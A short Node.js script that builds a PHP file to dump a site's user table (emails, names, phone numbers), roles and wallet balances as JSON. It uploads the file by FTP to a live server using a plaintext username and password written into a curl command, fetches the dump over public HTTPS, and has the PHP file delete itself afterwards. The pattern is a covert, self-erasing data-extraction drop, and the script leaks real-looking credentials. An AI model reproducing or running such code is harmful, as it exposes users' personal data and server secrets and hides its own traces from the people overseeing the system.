import { execSync } from 'child_process';
import fs from 'fs';

const phpScript = `<?php
header("Content-Type: application/json");
try {
    $cfg = require __DIR__ . "/api/config/config.php";
    $dbCfg = $cfg["database"];
    $pdo = new PDO("mysql:host=" . $dbCfg["host"] . ";dbname=" . $dbCfg["database"] . ";charset=utf8mb4", $dbCfg["username"], $dbCfg["password"], [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);

    // Count all in User
    $userCount = $pdo->query("SELECT COUNT(*) FROM User")->fetchColumn();

    // Check distinct roles in UserRole
    $userRoles = [];
    try {
        $userRoles = $pdo->query("SELECT ur.userId, r.name as roleName FROM UserRole ur JOIN Role r ON ur.roleId = r.id")->fetchAll(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $userRoles = ["error" => $e->getMessage()];
    }

    // Check Wallet table
    $wallets = [];
    try {
        $wallets = $pdo->query("SELECT userId, balance FROM Wallet LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $wallets = ["error" => $e->getMessage()];
    }

    // List all users in User
    $allUsers = $pdo->query("SELECT id, email, firstName, lastName, phoneNumber, status FROM User")->fetchAll(PDO::FETCH_ASSOC);

    echo json_encode([
        "success" => true,
        "userCount" => $userCount,
        "allUsers" => $allUsers,
        "userRolesCount" => is_array($userRoles) ? count($userRoles) : 0,
        "sampleRoles" => array_slice($userRoles, 0, 10),
        "sampleWallets" => $wallets
    ]);
} catch (Exception $e) {
    echo json_encode(["success" => false, "error" => $e->getMessage()]);
}
@unlink(__FILE__);
`;

fs.writeFileSync('/tmp/_audit_legacy.php', phpScript);
execSync('curl -s -m 30 -T /tmp/_audit_legacy.php --user "qfqzpeqx:2h9PAQk[kE[t96" "ftp://51.89.153.183:21/public_html/_audit_legacy.php"');
const res = execSync('curl -s -m 20 "https://hambaktech.com.ng/_audit_legacy.php"', { encoding: 'utf-8' });
console.log('Legacy audit result:', res);
